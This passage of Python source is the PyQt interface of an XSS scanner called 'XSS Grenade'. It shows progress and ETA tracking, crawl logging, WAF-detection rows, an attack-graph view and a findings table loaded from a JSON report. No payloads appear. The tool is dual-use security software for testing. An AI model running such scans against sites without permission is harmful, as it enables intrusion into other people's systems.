                    # nonce-reuse, meta-tag-csp, wildcard-host, or css-injection finding.
                    "csp_bypass_finding": d.get("csp_bypass_finding"),
                }
                self._attack_graph.mark_hit(hit_path, hit_param, details=hit_details)
            except Exception as e:
                self._dbg_log(f"[attack_graph] mark_hit failed: {e}")

    def _show_vulnerability_dialog(self, details: dict):
        """Handler for sig_hit_clicked — opens VulnerabilityDetailDialog."""
        try:
            dlg = VulnerabilityDetailDialog(details, parent=self)
            dlg.exec_()
        except Exception as e:
            self._dbg_log(f"[vuln_dialog] failed: {e}")
            self.sb.showMessage(f"Detail dialog failed: {e}", 3000)

    def _waf(self, d):
        m = f"[WAF] {d['name']} na {d['host']} (confidence: {d['confidence']}%)"
        _m = m.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        self.log_out.append(f'<span style="color:#3b82f6">{_m}</span>')
        row = self._res_tbl_new_row()
        def cell(text, color="#cccccc"):
            item = QTableWidgetItem(str(text))
            item.setForeground(QColor(color))
            return item
        # 11 sloupců (v10.11+): URL | Param | Kontext | Klasa | CVE | Probe | Zdroj | Status | WAF | CSP | Payload
        self.res_tbl.setItem(row, 0,  cell(d.get("host",""),  "#cccccc"))
        self.res_tbl.setItem(row, 1,  cell("—",                "#555555"))
        self.res_tbl.setItem(row, 2,  cell("WAF_DETECTED",    "#f97316"))
        self.res_tbl.setItem(row, 3,  cell("—",                "#555555"))   # Klasa: WAF detection není XSS finding
        self.res_tbl.setItem(row, 4,  cell("—",                "#555555"))   # CVE
        self.res_tbl.setItem(row, 5,  cell("—",                "#555555"))   # Probe
        self.res_tbl.setItem(row, 6,  cell("waf",              "#666666"))
        self.res_tbl.setItem(row, 7,  cell("—",                "#555555"))
        self.res_tbl.setItem(row, 8,  cell(d.get("name",""),   "#3b82f6"))
        self.res_tbl.setItem(row, 9,  cell(f"{d.get('confidence','')}%", "#888888"))
        self.res_tbl.setItem(row, 10, cell(d.get("reason",""), "#666666"))
        	
    def _cpro(self, d):
        vis = d.get("visited",0); mx = d.get("max_pages",1)
        # v10.16: busy/neurčitý režim — crawl běží, celkový počet neznámý.
        # setRange(0,0) přepne QProgressBar do animovaného "busy" stavu.
        if self.cpb.maximum() != 0:
            self.cpb.setRange(0, 0)
        self.cpb_lbl.setText(f"CRAWLING · {vis}")
        self._cp._val.setText(str(vis))
        self._ce._val.setText(str(d.get("errors",0)))
        self._cr._val.setText(f"{d.get('rate',0):.1f}")
        self._cpar._val.setText(str(d.get("params_found",0)))
        # Aktuální URL
        cur_url = d.get("current_url", "")
        url_str = f" → {cur_url[:80]}" if cur_url else ""
        m = f"[CRAWL] {vis}/{mx} | D:{d.get('depth',0)} | OK:{d.get('success',0)} ERR:{d.get('errors',0)} | Q:{d.get('queue',0)} | {d.get('rate',0):.1f}p/s{url_str}"
        # url_str carries a crawled URL (attacker-influenced query) → escape before
        # appending to the rich-text console log.
        _m = m.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        self.clog.append(f'<span style="color:{theme("fg_muted")}">{_m}</span>')
        self.clog.moveCursor(QTextCursor.End)
        self.tabs.setCurrentIndex(1)

        # Attack graph — přidej crawlovanou path (+ params pokud má query)
        if hasattr(self, '_attack_graph') and cur_url:
            try:
                from urllib.parse import urlparse as _up, parse_qs as _pq
                parsed = _up(cur_url)
                path = parsed.path or "/"
                self._attack_graph.add_path(path)
                if parsed.query:
                    for pname in _pq(parsed.query).keys():
                        self._attack_graph.add_param(path, pname)
            except Exception as e:
                self._dbg_log(f"[attack_graph] add_path failed: {e}")

    def _cdone(self, d):
        self._cp._val.setText(str(d.get("pages",0)))
        self._cpar._val.setText(str(d.get("params_found",0)))
        self._ce._val.setText(str(d.get("errors",0)))
        # v10.16: ukonči busy animaci — zpět na určitý rozsah a vyplň na 100 %.
        self.cpb.setRange(0, 100); self.cpb.setValue(100)
        self.cpb_lbl.setText(f"DONE · {d.get('pages',0)}")
        m = f"ON Crawler done: {d.get('pages',0)} pages | {d.get('params_found',0)} URLs with parameters | {d.get('elapsed',0):.1f}s"
        self.clog.append(f'<span style="color:#22c55e">{m}</span>')
        self.tabs.setTabText(1, f"CRAWLER  [{d.get('pages',0)}]")

    # v10.16: strop na results tabulku — stejně jako log_out má
    # setMaximumBlockCount. Bez něj při skenu s tisíci nálezů/WAF blocků
    # tabulka roste neomezeně a GUI sekne na každém insertRow (přepočet
    # layoutu). Kruhový buffer: po dosažení limitu zahodí nejstarší řádek.
    _RES_TBL_MAX_ROWS = 5000

    def _res_tbl_new_row(self) -> int:
        """Vrátí index nového řádku v res_tbl; pokud je tabulka na stropu,
        nejdřív zahodí nejstarší řádek (FIFO). Nahrazuje
        `row = rowCount(); insertRow(row)`."""
        if self.res_tbl.rowCount() >= self._RES_TBL_MAX_ROWS:
            self.res_tbl.removeRow(0)
        row = self.res_tbl.rowCount()
        self.res_tbl.insertRow(row)
        return row

    @staticmethod
    def _format_eta(remaining: float, cap_24h: bool = True) -> str:
        """v10.15: formát času s písmeny jednotek.
        < 1 min → 'SSs' (např. '45s'); 1 min–1 h → 'Mm SSs' (např. '2m 30s');
        1 h+ → 'Hh MMm' (např. '3h 50m').
        ETA (odhad): nad 24 h se ořízne na '> 24h' (cap_24h=True) — tak dlouhý
        odhad bývá nepřesný brzký výstřel. ELAPSED (reálně naměřený čas):
        cap_24h=False → hodiny rostou dál ('30h 12m').
        """
        r = int(max(0, remaining))
        if r < 60:
            return f"{r}s"
        if r < 3600:
            m, s = divmod(r, 60)
            return f"{m}m {s:02d}s"
        if cap_24h and r >= 86400:
            return "> 24h"
        h, rem = divmod(r, 3600)
        m = rem // 60
        return f"{h}h {m:02d}m"

    def _prog(self, c, t):
        """
        Per-phase ETA tracker s smoothed rate.

        Drží buffer 50 samples (~5 sekund historie při 10Hz nebo
        ~0.5s při 100Hz). Spočítá rate jako (count_delta) / (time_delta)
        ze starší/novější samply, pokud je time_delta aspoň 0.2s.
        """
        if t <= 0:
            return
        self.pb.setValue(int(c / t * 100))

        # Inicializace per-phase trackeru pokud chybí
        if not hasattr(self, '_phase_progress') or self._phase_progress is None:
            self._phase_progress = {"total": t, "start": time.time(), "samples": [], "last_c": 0}

        prev = self._phase_progress

        # Detekce nové fáze: total se výrazně změnil nebo c kleslo (reset pro novou fázi)
        new_phase = (t != prev["total"]) or (c < (prev.get("last_c") or 0) - 5)
        if new_phase:
            self._phase_progress = {
                "total": t,
                "start": time.time(),
                "samples": [],
                "last_c": c,
            }
            prev = self._phase_progress

        prev["last_c"] = c

        # Sběr samples — větší buffer pro lepší smoothing při high-rate scanech
        now = time.time()
        prev["samples"].append((now, c))
        # 50 samples = ~5s při 10Hz, ~0.5s při 100Hz
        if len(prev["samples"]) > 50:
            prev["samples"] = prev["samples"][-50:]

        # Spočítej smoothed rate z nejstaršího vs současného samplu
        if len(prev["samples"]) >= 2:
            old_t, old_c = prev["samples"][0]
            time_delta = now - old_t
            count_delta = c - old_c
            # Práh 0.2s (ne 0.5) — rychlejší aktualizace ETA
            if time_delta >= 0.2 and count_delta > 0:
                rate = count_delta / time_delta
                remaining = (t - c) / rate if rate > 0 else 0
                self._c_eta._val.setText(self._format_eta(remaining))
                return

        # Fallback: pokud nemáme dost dat ze samples, ale jsme v fázi
        # už aspoň 1 sekundu, použij celkový čas od začátku fáze
        elapsed_in_phase = now - prev["start"]
        if elapsed_in_phase >= 1.0 and c > 0:
            rate = c / elapsed_in_phase
            remaining = (t - c) / rate if rate > 0 else 0
            self._c_eta._val.setText(self._format_eta(remaining))
            return

        # Není dost dat ani pro fallback — ukaž "estimating…", ne prázdné "--:--"
        self._c_eta._val.setText("estimating…")

    def _phase(self, p, d):
        # Reset per-phase progress tracker při změně fáze
        # — každá fáze má svůj odhad ETA, ne kumulativní.
        # v10.52: během běhu NIKDY neukazuj prázdné "--:--" (čte se jako
        # "rozbité/neznámé"). Mezi fázemi / než naběhne první sample ukaž
        # "estimating…" — uživatel vidí, že se odhad počítá, ne že je mrtvý.
        if hasattr(self, '_phase_progress'):
            del self._phase_progress
        self._c_eta._val.setText("estimating…")

        lbl = {"crawl":"CRAWLER...","scan":f"SCANNING ({d.get('total',0)} TASKS)...","probe":"PRE-SCAN PROBE...","post":"POST SCAN...","json":"JSON SCAN...","headers":"HEADER SCAN...","fuzz":"FUZZING...","dom":"DOM VALIDATION...","context":"CONTEXT SCAN...","stored":"STORED XSS SCAN...","path":"PATH-SEGMENT SCAN...","cookie":"COOKIE-REFLECTED SCAN...","blind_xss":"BLIND XSS...","postmessage":"postMessage XSS...","websocket":"WebSocket XSS...","cors_crawled":"CORS (crawled pages)...","jsonp":"JSONP INJECTION...","graphql":"GraphQL XSS...","dangling_markup":"DANGLING MARKUP...","svg_xml":"SVG/XML REFLECTION...","done":f"FINISH — {d.get('hits',0)} HITS","crawler_start":"CRAWLER STARTED..."}.get(p, p.upper())
        self.sb.showMessage(lbl); self.log_out.append(f'<span style="color:{theme("fg_muted")}">── {lbl} ──</span>')

        # ── v3 GATE STATS — při done zobraz, kolik dropla která fáze ──
        if p == "done":
            try:
                # Získej referenci na xss_grenade modul přes worker
                if self.worker and hasattr(self.worker, "_xg_module"):
                    mod = self.worker._xg_module
                else:
                    # Fallback: import přímo
                    import importlib.util, os as _os
                    here = _os.path.dirname(_os.path.abspath(__file__))
                    mod_path = _os.path.join(here, "xss_grenade.py")
                    spec = importlib.util.spec_from_file_location("xss_grenade", mod_path)
                    mod = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(mod)
                stats = mod.get_emit_stats() if hasattr(mod, "get_emit_stats") else None
                if stats:
                    summary = (
                        f'<span style="color:#22c55e">'
                        f'[GATE STATS] emitted: <b>{stats.get("emitted",0)}</b> &nbsp;·&nbsp; '
                        f'</span>'
                        f'<span style="color:#888">'
                        f'dedup-dropped: {stats.get("dedup_dropped",0)} &nbsp;·&nbsp; '
                        f'gate-dropped: {stats.get("gate_dropped",0)} &nbsp;·&nbsp; '
                        f'probe: ✓{stats.get("render_probe_passed",0)} '
                        f'✗{stats.get("render_probe_dropped",0)} '
                        f'—{stats.get("render_probe_skipped",0)}'
                        f'</span>'
                    )
                    self.log_out.append(summary)
                    # Pokud byla redukce dramatická, ukaž to v statusbaru
                    total_seen = sum(stats.values())
                    if total_seen > 0:
                        emitted = stats.get("emitted", 0)
                        if emitted > 0 and total_seen >= emitted * 10:
                            ratio = total_seen / emitted
                            self.sb.showMessage(
                                f"GATE: noise reduction {ratio:.0f}× "
                                f"({total_seen} → {emitted} unique findings)",
                                10000  # 10 sekund
                            )
            except Exception as e:
                self._dbg_log(f"[gate_stats] failed: {e}")

    def _done(self, results, elapsed):
        was_stopped = self._stopping
        self._stopping = False
        self._poll_queues(drain_all=True)   # final drain BEFORE summary/finish
        self._finish(stopped=was_stopped)
        verb = "Scan Stopped" if was_stopped else "Scan Finished"
        msg = f"{verb}  — {self.hit_count} HITS | {self._format_eta(elapsed, cap_24h=False)}"
        self.log_out.append(f'<span style="color:#22c55e">{msg}</span>')
        # On a clean finish the bar is full; on a user stop leave it where it was
        # so it visibly reflects that the scan didn't complete.
        if not was_stopped:
            self.pb.setValue(100)
        self.sb.showMessage(msg)
        if self.res_tbl.rowCount() > 0:
            self.tabs.setCurrentIndex(3)
    def _load_results_from_json(self):
        """Loads results from a JSON report and displays them in the table."""
        import json as _json
        import os as _os

        # v10.16: JSON report je teď volitelný. Když ho uživatel nezapnul,
        # nehledej soubor a nehlas chybu — tabulka nálezů se stejně plní
        # živě přes on_hit během skenu, tohle je jen post-scan refresh.
        if hasattr(self, "ck_json_report") and not self.ck_json_report.isChecked():
            return

        json_path = self.inp_jrp.text() if hasattr(self, 'inp_jrp') else "xss_report.json"
        if not json_path:
            json_path = "xss_report.json"

        # Hledej report relativně k xss_grenade.py
        here = _os.path.dirname(_os.path.abspath(__file__))
        candidates = [
            json_path,
            _os.path.join(here, json_path),
            _os.path.join(_os.getcwd(), json_path),
        ]

        data = None
        for path in candidates:
            if _os.path.exists(path):
                try:
                    with open(path, encoding="utf-8") as f:
                        data = _json.load(f)
                    break
                except Exception:
                    continue

        if data is None:
            self.log_out.append('<span style="color:#f59e0b">WARN JSON report not found — results cannot be displayed</span>')
            return

        # v10.16: report nově ukládá "findings" (jen potvrzené nálezy).
        # Starší reporty měly "found" (zašuměný seznam) — fallback kvůli
        # zpětné kompatibilitě při načtení staršího reportu.
        found = data.get("findings", data.get("found", []))
        if not found:
            self.log_out.append(f'<span style="color:{theme("fg_muted")}">No findings in the report.</span>')
            return

        # v10.16: severity breakdown z reportu (pokud je) — rychlý přehled
        # pro triáž nad tabulkou.
        _summ = data.get("summary")
        if _summ and isinstance(_summ.get("by_severity"), dict):
            bs = _summ["by_severity"]
            parts = []
            for sev, col in (("critical", "#dc2626"), ("high", "#ff2d55"),
                             ("medium", "#f59e0b"), ("low", "#3b82f6"),
                             ("info", "#9ca3af")):
                n = bs.get(sev, 0)
                if n:
                    parts.append(f'<span style="color:{col}">{sev}: {n}</span>')
            uniq = _summ.get("total", len(found))
            line = (f'SUMMARY — {uniq} unique findings'
                    + ('  |  ' + '  '.join(parts) if parts else ''))
            self.log_out.append(f'<span style="color:#22c55e">{line}</span>')

        # Vyčisti tabulku a naplň ji
        self.res_tbl.setRowCount(0)
        self.hit_count = 0

        ctx_colors = {
            "script_body":   "#ff2d55",
            "event_handler": "#ff2d55",
            "href_attr":     "#f59e0b",
            "html_attr":     "#fbbf24",
            "html_body":     "#aaaaaa",
            "POST":          "#3b82f6",
            "JSON":          "#8b5cf6",
            "HEADER":        "#22c55e",
        }

        # Sestavit host->waf mapu z celého reportu
        host_waf = {}
        for e in found:
            w = e.get("waf")
            if isinstance(w, dict) and w.get("name"):
                from urllib.parse import urlparse as _up
                h = (_up(e.get("url","")).hostname or "").lower()
                if h not in host_waf:
                    host_waf[h] = w.get("name","")

        csp_score = data.get("csp_analysis", {}).get("score", "?")
        seen = set()
        for entry in found:
            from urllib.parse import urlparse as _up
            url    = str(entry.get("url") or "")
            param  = str(entry.get("param") or "")
            status_raw = entry.get("status") or 0
            try: status_int = int(status_raw)
            except: status_int = 0
            ctx    = str(entry.get("context") or "")
            waf_d  = entry.get("waf")
            has_waf = isinstance(waf_d, dict) and bool(waf_d.get("name"))

            # Získat WAF pro daný host
            _h = (_up(url).hostname or "").lower()
            host_waf_name = host_waf.get(_h, "")

            # FILTR: zobraz pouze
            # 1. Skutečné XSS hity (context vyplněný)
            # 2. WAF-block hit (307 + WAF detekován pro tento host) - jen 1x na (path, param)
            if not ctx and not host_waf_name:
                continue

            # Deduplikace:
            # - XSS hit: deduplikovat na (url_bez_payloadu, param) = (netloc+path, param)
            # - WAF block: deduplikovat na (netloc+path, param) - jen 1 řádek na parametr
            _p = _up(url)
            dedup_key = (_p.netloc + _p.path, param)
            if dedup_key in seen:
                continue
            seen.add(dedup_key)

            # WAF block context
            if not ctx and status_int in (302, 303, 307, 308) and host_waf_name:
                ctx = f"WAF_BLOCK ({host_waf_name})"

            # Konečný WAF string
            if has_waf:
                waf = str(waf_d.get("name",""))
            else:
                waf = host_waf_name

            self.hit_count += 1
            source  = str(entry.get("source") or "seed")
            status  = str(status_raw)
            payload = str(entry.get("payload") or entry.get("payload_mutated") or "")
            csp_note = str(entry.get("csp_note") or f"CSP score: {csp_score}/100")

            row = self._res_tbl_new_row()
            def cell(text, color="#cccccc"):
                item = QTableWidgetItem(str(text))
                item.setForeground(QColor(color))
                return item
            ctx_colors = {
                "script_body":"#ff2d55","event_handler":"#ff2d55",
                "href_attr":"#f59e0b","html_attr":"#fbbf24","html_body":"#aaaaaa",
                "POST":"#3b82f6","JSON":"#8b5cf6","HEADER":"#22c55e",
                "WAF_BLOCK":     "#f97316",
            }
            url_item = QTableWidgetItem(url)
            url_item.setForeground(QColor("#cccccc"))
            url_item.setToolTip(url)
            pl_item = cell(payload, "#666666")
            pl_item.setToolTip(payload)
            # v10.12: Use _extract_cwe_cve helper — CVE if known, CWE fallback
            cve_id_import, cve_color_import, cve_tooltip_import = (
                self._extract_cwe_cve(entry)
            )
            # 11 sloupců (v10.11+, v10.12 CWE/CVE): URL | Param | Kontext | Klasa | CWE/CVE | Probe | Zdroj | Status | WAF | CSP | Payload
            self.res_tbl.setItem(row, 0,  url_item)
            self.res_tbl.setItem(row, 1,  cell(param,        "#e0e0e0"))
            self.res_tbl.setItem(row, 2,  cell(ctx,          ctx_colors.get(ctx, "#fbbf24")))
            self.res_tbl.setItem(row, 3,  cell("—",          "#555555"))   # Klasa: JSON import doesn't have klass_label
            cell_with_tip = cell(cve_id_import, cve_color_import)
            if cve_tooltip_import:
                cell_with_tip.setToolTip(cve_tooltip_import)
            self.res_tbl.setItem(row, 4,  cell_with_tip)
            self.res_tbl.setItem(row, 5,  cell("—",          "#555555"))   # Probe
            self.res_tbl.setItem(row, 6,  cell(source,       "#666666"))
            self.res_tbl.setItem(row, 7,  cell(status,       "#555555"))
            self.res_tbl.setItem(row, 8,  cell(waf,          "#3b82f6"))
            self.res_tbl.setItem(row, 9,  cell(csp_note,     "#888888"))
            self.res_tbl.setItem(row, 10, pl_item)
            self._apply_row_tint(self.res_tbl, row,
                                 entry.get("gate_severity") or entry.get("severity"))


    def _err(self, msg):
        # v10.80: drain any hits the worker queued before it crashed, so a scan
        # error doesn't silently lose already-detected findings.
        try:
            self._poll_queues(drain_all=True)
        except Exception:
            pass
        self._finish(errored=True); self.log_out.append(f'<span style="color:#ef4444">[ERROR] {msg}</span>'); self.sb.showMessage(f"CHYBA: {msg[:120]}")

    def _dbg_log(self, msg):
        try:
            self._dbg.write(f"{time.time():.3f} {msg}\n")
            self._dbg.flush()
        except Exception:
            pass

    def _poll_queues(self, drain_all=False):
        if not self.worker:
            return
        self._refresh_telemetry_tiles()
        # Poll hit queue
        qs = self.worker.hit_q.qsize()
        if qs > 0:
            self._dbg_log(f"[POLL] hit_q.qsize={qs}")
        # v10.80: cap the per-tick drain so a large finding burst can't block the
        # GUI thread building hundreds of table rows in one 80ms tick (UI stall).
        # Final drains (scan end / stop / error) pass drain_all=True so nothing is
        # left behind.
        _cap = (10 ** 9) if drain_all else 200
        _n = 0
        try:
            while _n < _cap:
                d = self.worker.hit_q.get_nowait()
                _n += 1
                self._dbg_log(f"[POLL] GOT HIT: url={d.get('url','')[:80]} ctx={d.get('context','')}")
                try:
                    self._hit(d)
                    self._dbg_log(f"[POLL] _hit() OK, hit_count={self.hit_count}")
                except Exception as e:
                    self._dbg_log(f"[POLL] _hit() EXCEPTION: {e}")
                    import traceback
                    self._dbg.write(traceback.format_exc())
                    self._dbg.flush()
        except _queue.Empty:
            pass
        # Poll waf queue
        try:
            while True:
                d = self.worker.waf_q.get_nowait()
                self._dbg_log(f"[POLL] GOT WAF: {d.get('name','')}")
                try:
                    self._waf(d)
                    self._dbg_log(f"[POLL] _waf() OK")
                except Exception as e:
                    self._dbg_log(f"[POLL] _waf() EXCEPTION: {e}")
                    import traceback
                    self._dbg.write(traceback.format_exc())
                    self._dbg.flush()
        except _queue.Empty:
            pass

    def _tick(self):
        if self.start_time:
            self._c_elapsed._val.setText(
                self._format_eta(time.time() - self.start_time, cap_24h=False))
        self._refresh_telemetry_tiles()


# ══════════════════════════════════════════════════════════════════════

def main():
    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

    app = QApplication(sys.argv)
    app.setApplicationName("XSS Grenade")
    app.setOrganizationName("TX-C0RE")

    # v10.29: načti uložené téma (dark|light) a aplikuj. Default dark.
    _saved = QSettings("TX-C0RE", "XSS Grenade").value("ui/theme", "dark")
    _saved = _saved if _saved in PALETTES else "dark"
    set_active_theme(_saved)
    app.setStyleSheet(build_stylesheet(PALETTES[_saved]))

    w = XSSGrenadeGUI()
    w.show()

    sys.exit(app.exec_())
if __name__ == "__main__":
    main()
